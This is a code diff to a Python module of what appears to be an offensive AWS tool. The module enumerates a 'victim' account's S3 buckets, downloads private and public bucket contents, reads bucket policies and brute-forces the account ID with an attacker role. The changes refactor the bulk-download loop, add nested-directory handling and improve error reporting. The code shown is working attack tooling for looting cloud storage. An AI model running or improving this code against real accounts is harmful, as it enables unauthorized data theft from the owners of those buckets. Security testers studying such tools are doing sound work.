@@ -7,15 +7,16 @@ from botocore.exceptions import ClientError
 
 def s3_init_enum(victim_s3_client, attacker_session):
     buckets = my_globals.victim_buckets
+    buckets = list(buckets or [])  # Prevent list type error
     if victim_s3_client:
         found_buckets = list_buckets(victim_s3_client)
         if found_buckets:
-            buckets = list(buckets or []) # Prevent list type error
             buckets += found_buckets
         download_private_bucket(victim_s3_client, buckets)
         get_bucket_policy(victim_s3_client, buckets)
-    public_buckets = list_public_buckets(my_globals.unsigned_s3_client, buckets)
-    download_public_bucket(my_globals.unsigned_s3_client, buckets)
+    else:
+        public_buckets = list_public_buckets(my_globals.unsigned_s3_client, buckets)
+        download_public_bucket(my_globals.unsigned_s3_client, buckets)
     # If victim AWS account ID was not provided, then brute-force it from a public bucket
     if not my_globals.victim_aws_account_ID:
         if public_buckets and my_globals.attacker_S3_role_arn and attacker_session :
@@ -55,7 +56,7 @@ def list_public_buckets(unsigned_s3_client, buckets):
                     print(f"{Fore.MAGENTA}Public access detected on: {bucket}")
                     found_buckets.append(bucket)
                     for obj in response['Contents'][:5]:
-                        print(f"{Fore.MAGENTA}- {obj['Key']}")
+                        print(f"{Fore.MAGENTA} | {obj['Key']}")
                 else:
                     print(f"{Fore.LIGHTBLACK_EX}No public content or access denied for: {bucket}")
             except KeyboardInterrupt:
@@ -81,7 +82,7 @@ def get_bucket_policy(s3_client, buckets):
     else:
         print(f"{Fore.LIGHTBLACK_EX}No buckets provided, skipping bucket policy check")
 
-def create_bucket_dirs(bucket):
+def create_bucket_root_dir(bucket):
     try:
         os.mkdir(bucket)
     except KeyboardInterrupt:
@@ -89,7 +90,12 @@ def create_bucket_dirs(bucket):
     except:
         pass
 
-def delete_bucket_dirs(bucket):
+def ensure_dir_for_file(file_path):
+    dir_name = os.path.dirname(file_path)
+    if dir_name and not os.path.exists(dir_name):
+        os.makedirs(dir_name, exist_ok=True)
+
+def remove_empty_bucket_dir(bucket):
     try:
         if os.path.exists(bucket) and os.path.isdir(bucket) and len(os.listdir(bucket)) == 0:
             os.rmdir(bucket)
@@ -103,43 +109,54 @@ def download_bucket_objects(s3_client, buckets):
     if not buckets:
         print(f"{Fore.LIGHTBLACK_EX}No buckets provided, skipping download bucket objects")
         return
+
     for bucket in buckets:
-        failed_to_download_file_number = 0
         try:
             print(f"{Fore.CYAN}\rProcessing bucket: {bucket}")
-            create_bucket_dirs(bucket)
+            create_bucket_root_dir(bucket)
             os.chdir(bucket)
-            bucket_objects = s3_client.list_objects_v2(Bucket=bucket)
-            contents = bucket_objects.get("Contents", [])
-            if not contents:
+
+            response = s3_client.list_objects_v2(Bucket=bucket)
+            objects = response.get("Contents", [])
+
+            if not objects:
                 print(f"{Fore.LIGHTBLACK_EX}No objects found in bucket: {bucket}")
                 os.chdir("..")
+                remove_empty_bucket_dir(bucket)
                 continue
-            total_files = len(contents)
-            for i, bucket_contents in enumerate(contents, start=1):
-                file_name = str(bucket_contents["Key"])
-                sys.stdout.write("\r\033[K")  # \033[K clears from cursor to end of line
-                sys.stdout.write(f"{Fore.MAGENTA}[{i}/{total_files}] Downloading {file_name}")
+
+            files = [obj["Key"] for obj in objects if not obj["Key"].endswith("/")]
+            total_files = len(files)
+            failed = 0
+
+            for idx, key in enumerate(files, start=1):
+                sys.stdout.write("\r\033[K")
+                sys.stdout.write(f"{Fore.MAGENTA}[{idx}/{total_files}] Downloading {key}")
                 sys.stdout.flush()
-                if(i == total_files):
-                    print("\r") # Add a new carriage return in the terminal after download has completed.
+
                 try:
-                    with open(file_name, "wb") as file:
-                        s3_client.download_fileobj(bucket, file_name, file)
+                    ensure_dir_for_file(key)
+                    with open(key, "wb") as f:
+                        s3_client.download_fileobj(bucket, key, f)
                 except KeyboardInterrupt:
                     raise
-                except:
-                    failed_to_download_file_number += 1
-            print(f"{Fore.LIGHTBLACK_EX} | Downloaded {total_files - failed_to_download_file_number} of {total_files} files from {bucket}")
+                except Exception as e:
+                    print(f"\n{Fore.RED}Failed to download {key}: {e}")
+                    failed += 1
+
+            print("\r")
+            print(f"{Fore.LIGHTBLACK_EX} | Downloaded {total_files - failed} of {total_files} files from {bucket}")
+
             os.chdir("..")
-            delete_bucket_dirs(bucket)
+            remove_empty_bucket_dir(bucket)
+
         except KeyboardInterrupt:
             raise
-        except:
+        except Exception as e:
             sys.stdout.write(" " * shutil.get_terminal_size((80, 20)).columns + "\r")
-            print(f"{Fore.LIGHTBLACK_EX}Can't list bucket: {bucket}")
+            print(f"{Fore.LIGHTBLACK_EX}Can't process bucket {bucket}: {e}")
             os.chdir("..")
-            delete_bucket_dirs(bucket)
+            remove_empty_bucket_dir(bucket)
 
 def brute_force_aws_account_id(public_buckets, s3_role_arn, attacker_session):
     public_bucket = public_buckets[0]
